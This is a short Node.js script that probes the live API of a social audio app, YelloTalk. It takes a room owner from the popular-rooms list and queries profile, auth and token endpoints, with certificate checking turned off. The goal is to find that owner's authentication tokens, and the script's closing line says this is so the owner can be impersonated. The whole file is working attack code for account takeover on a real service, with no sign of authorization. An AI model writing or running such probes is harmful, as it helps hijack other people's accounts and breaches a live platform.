const axios = require('axios');
const https = require('https');
const fs = require('fs');

const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
const TOKEN = config.jwt_token;
const httpsAgent = new https.Agent({ rejectUnauthorized: false });

async function test() {
    const rooms = await axios.get('https://live.yellotalk.co/v1/rooms/popular', {
        headers: { 'Authorization': `Bearer ${TOKEN}` },
        httpsAgent
    });

    const room = rooms.data.json[0];
    const ownerUuid = room.owner.uuid;
    const ownerId = room.owner.id;

    console.log('Testing if profile endpoints return JWT tokens...');
    console.log('Owner:', room.owner.pin_name);
    console.log('UUID:', ownerUuid);
    console.log('ID:', ownerId);
    console.log();

    const endpoints = [
        `https://api.yellotalk.co/v1/users/profile/${ownerId}`,
        `https://api.yellotalk.co/v1/users/${ownerUuid}`,
        `https://live.yellotalk.co/v1/users/${ownerId}`,
        `https://api.yellotalk.co/v1/users/${ownerId}/auth`,
        `https://api.yellotalk.co/v1/users/${ownerId}/token`,
    ];

    for (const url of endpoints) {
        try {
            const resp = await axios.get(url, {
                headers: { 'Authorization': `Bearer ${TOKEN}` },
                httpsAgent,
                timeout: 3000
            });

            console.log(`✅ ${url}`);
            const respStr = JSON.stringify(resp.data);

            if (respStr.includes('token') || respStr.includes('auth') || respStr.includes('jwt')) {
                console.log('🎯 CONTAINS AUTH DATA!');
                console.log(respStr.substring(0, 300));
            } else {
                console.log('   Keys:', Object.keys(resp.data.json || resp.data).join(', '));
            }
        } catch (err) {
            const status = err.response ? err.response.status : 'error';
            if (status !== 404) {
                console.log(`⚠️  ${url} → ${status}`);
            }
        }
    }

    console.log('\nConclusion: If no tokens found, can\'t impersonate owner');
}

test();
